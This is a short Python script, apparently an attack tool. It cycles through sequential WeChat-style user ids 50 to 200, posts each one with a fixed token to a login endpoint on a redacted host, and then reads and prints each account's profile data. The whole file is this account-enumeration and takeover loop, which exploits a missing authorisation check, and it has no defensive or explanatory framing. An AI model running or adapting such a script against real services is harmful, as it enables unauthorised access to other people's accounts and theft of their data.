import requests,json


def testfuck():
    for i in range(50, 201):
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                   'Accept-Encoding': 'gzip, deflate, compress',
                   'Accept-Language': 'en-us;q=0.5,en;q=0.3',
                   'Cache-Control': 'max-age=0',
                   'Connection': 'keep-alive',
                   'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}

        s = requests.Session()
        s.headers.update(headers)
        #p = '{"where":{"wxUserId":' + str(i) + ',"mobileFlag":"OLEBcGBT"}}'
        data={'where':{'wxUserId':str(i),'mobileFlag':'OLEBcGBT'}}



        _URL = 'http://xxx/pro/hxc/web/prowxuser/hlogin.htm'
        r = s.post(_URL, params={'data': json.dumps(data)})
        print(r.text)

        _URL = 'http://xxx/pro/hxc/mobile/prowxuser/read.htm'
        r = s.post(_URL,
                   params={'data': '{"mobileFlag":"OLEBcGBT"}'})
        print(r.text)
        print(r.json()["data"]["id"])
        i = i + 1


if __name__ == '__main__':
    testfuck()
